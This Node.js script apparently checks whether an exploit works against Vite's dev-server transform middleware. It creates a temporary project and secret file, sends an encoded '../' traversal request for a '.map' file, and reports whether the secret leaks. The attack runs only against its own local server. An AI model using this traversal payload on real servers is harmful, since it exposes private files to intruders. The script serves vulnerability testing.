const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  const marker = 'vite_pt_' + Date.now() + '_' + Math.random().toString(16).slice(2);

  try {
    const vite = require('vite');
    if (!vite || typeof vite.createServer !== 'function') {
      throw new Error('vite.createServer unavailable');
    }

    const base = path.join(os.tmpdir(), marker);
    const root = path.join(base, 'root');
    const depsDir = path.join(root, 'node_modules', '.vite', 'deps');
    fs.mkdirSync(depsDir, { recursive: true });

    fs.writeFileSync(path.join(root, 'index.html'), '<!doctype html><html><body>ok</body></html>');
    fs.writeFileSync(path.join(depsDir, 'safe.js.map'), '{"version":3,"file":"safe.js","sources":["safe.ts"],"names":[],"mappings":""}');

    const outsideFile = path.join(base, 'outside-secret.txt');
    const secret = 'SECRET_' + marker;
    fs.writeFileSync(outsideFile, secret);

    const server = await vite.createServer({
      root,
      logLevel: 'silent',
      server: { middlewareMode: true }
    });

    const stack = server.middlewares && server.middlewares.stack ? server.middlewares.stack : null;
    if (!stack || !Array.isArray(stack)) {
      throw new Error('unexpected middleware stack');
    }

    const transformLayer = stack.find((l) => l && l.route === '' && l.handle && l.handle.toString().includes('transformMiddleware'));
    if (!transformLayer || typeof transformLayer.handle !== 'function') {
      throw new Error('transformMiddleware not found');
    }

    async function runTransform(url) {
      return new Promise((resolve, reject) => {
        const req = { method: 'GET', url, headers: { accept: '*/*' } };
        const chunks = [];
        const res = {
          statusCode: 200,
          _headers: {},
          setHeader(k, v) { this._headers[String(k).toLowerCase()] = v; },
          getHeader(k) { return this._headers[String(k).toLowerCase()]; },
          end(data) {
            if (data != null) chunks.push(Buffer.from(String(data)));
            resolve({ statusCode: this.statusCode || 200, body: Buffer.concat(chunks).toString('utf8') });
          },
          write(data) {
            if (data != null) chunks.push(Buffer.from(String(data)));
            return true;
          }
        };

        try {
          transformLayer.handle(req, res, (err) => {
            if (err) return reject(err);
            resolve({ statusCode: res.statusCode || 404, body: Buffer.concat(chunks).toString('utf8'), next: true });
          });
        } catch (e) {
          reject(e);
        }
      });
    }

    try {
      const benign = await runTransform('/node_modules/.vite/deps/safe.js.map');
      if (benign.statusCode >= 400 || benign.body.indexOf('"version":3') === -1) {
        throw new Error('benign failed status=' + benign.statusCode + ' body=' + benign.body.slice(0, 120));
      }

      operation_completed = true;

      const maliciousUrl = '/node_modules/.vite/deps/' + encodeURIComponent('../../../outside-secret.txt') + '.map';
      let mal;
      try {
        mal = await runTransform(maliciousUrl);
      } catch (e) {
        exploit_succeeded = false;
        evidence = 'benign_status=' + benign.statusCode + ';malicious_exception=' + (e && e.message ? e.message : String(e));
        await server.close();
        console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
        return;
      }

      const leaked = mal.body.includes(secret);
      exploit_succeeded = leaked;
      evidence = 'benign_status=' + benign.statusCode + ';malicious_status=' + mal.statusCode + ';malicious_next=' + (!!mal.next) + ';leaked=' + leaked + ';malicious_len=' + mal.body.length;
    } finally {
      await server.close();
    }
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'exception=' + (e && e.message ? e.message : String(e));
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();